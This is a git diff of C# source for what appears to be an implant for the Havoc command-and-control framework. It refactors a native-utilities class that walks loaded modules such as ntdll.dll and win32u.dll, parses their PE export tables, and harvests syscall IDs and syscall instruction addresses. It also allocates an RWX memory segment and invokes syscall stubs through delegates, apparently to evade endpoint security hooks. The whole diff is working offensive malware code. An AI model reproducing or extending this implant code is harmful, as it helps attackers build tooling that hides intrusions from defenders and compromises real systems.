@@ -8,13 +8,15 @@ using System.Threading;
 using System.Net;
 namespace HavocImplant.NativeUtils
 {
-       public static class globalDll
+    public static class globalDll
 
     {
 
-        public static dll ntdll = new dll();
+        public static dll ntdll = new dll("ntdll.dll");
         public static dll kernel32 = new dll("kernel32.dll");
-
+        public static dll win32u = new dll("win32u.dll");
+        public static dll user32 = new dll("user32.dll");
+        public static dll kernelbase = new dll("kernelbase.dll");
     }
     public class dll
     {
@@ -45,7 +47,7 @@ namespace HavocImplant.NativeUtils
             public string funcName;
             public IntPtr funcAddr;
         }
-        public dll()
+        public dll(string dllName)
         {
             
             if (IntPtr.Size != 8)
@@ -59,16 +61,11 @@ namespace HavocImplant.NativeUtils
             this.dllLocation = IntPtr.Zero;
             foreach (ProcessModule p in current.Modules)
             {
-                if (p.ModuleName.ToLower() == "ntdll.dll")
+                if (p.ModuleName.ToLower() == dllName)
                 {
                     this.dllLocation = p.BaseAddress;
                     break;
                 }
-            }
-            if (this.dllLocation == IntPtr.Zero)
-            {
-                Console.WriteLine("[!] No shot ntdll isnt loaded YO WHAT");
-                return;
             }
             
             //Dinvoke magic to parse some very important properties
@@ -85,43 +82,14 @@ namespace HavocImplant.NativeUtils
             this.namesRva = Marshal.ReadInt32((IntPtr)(this.dllLocation.ToInt64() + exportRva + 0x20));
             this.ordinalsRva = Marshal.ReadInt32((IntPtr)(this.dllLocation.ToInt64() + exportRva + 0x24));
 
-            getSyscallIds();
-            getExports();
-            getSyscallInstructionAddresses();
-            GenerateRWXMemorySegment();
-            GenerateCoreCalls();
-        }
-        public dll(string dllName) 
-        {
-            Process current = Process.GetCurrentProcess();
-            this.dllLocation = IntPtr.Zero;
-            foreach (ProcessModule p in current.Modules)
+            if (dllName.ToLower() == "ntdll.dll" || dllName.ToLower() == "win32u.dll")
             {
-                if (p.ModuleName.ToLower() == dllName)
-                {
-                    this.dllLocation = p.BaseAddress;
-                    break;
-                }
+                getSyscallIds();
+                getSyscallInstructionAddresses();
+                GenerateRWXMemorySegment();
+                if (dllName.ToLower() == "ntdll.dll")
+                    GenerateCoreCalls();
             }
-            if (this.dllLocation == IntPtr.Zero)
-            {
-                Console.WriteLine($"[!] {dllName} not found in the current process");
-                return;
-            }
-            //Dinvoke magic to parse some very important properties
-            var peHeader = Marshal.ReadInt32((IntPtr)(this.dllLocation.ToInt64() + 0x3C));
-            var optHeader = this.dllLocation.ToInt64() + peHeader + 0x18;
-            var magic = Marshal.ReadInt16((IntPtr)optHeader);
-            long pExport = 0;
-            if (magic == 0x010b) pExport = optHeader + 0x60;
-            else pExport = optHeader + 0x70;
-            this.exportRva = Marshal.ReadInt32((IntPtr)pExport);
-            this.ordinalBase = Marshal.ReadInt32((IntPtr)(this.dllLocation.ToInt64() + exportRva + 0x10));
-            this.numberOfNames = Marshal.ReadInt32((IntPtr)(this.dllLocation.ToInt64() + exportRva + 0x18));
-            this.functionsRva = Marshal.ReadInt32((IntPtr)(this.dllLocation.ToInt64() + exportRva + 0x1C));
-            this.namesRva = Marshal.ReadInt32((IntPtr)(this.dllLocation.ToInt64() + exportRva + 0x20));
-            this.ordinalsRva = Marshal.ReadInt32((IntPtr)(this.dllLocation.ToInt64() + exportRva + 0x24));
-
             getExports();
         }
 
@@ -396,9 +364,6 @@ namespace HavocImplant.NativeUtils
             object[] freeArgs = new object[] { (IntPtr)(-1), stubLoc, (IntPtr)21, (uint)0x8000 };
             Marshal.GetDelegateForFunctionPointer(free, typeof(Delegates.NtFreeVirtualMemory)).DynamicInvoke(freeArgs);
 
-#if debug
-            Console.WriteLine($"Executed {name}");
-#endif
             return retValue;
         }
         public void getSyscallInstructionAddresses()
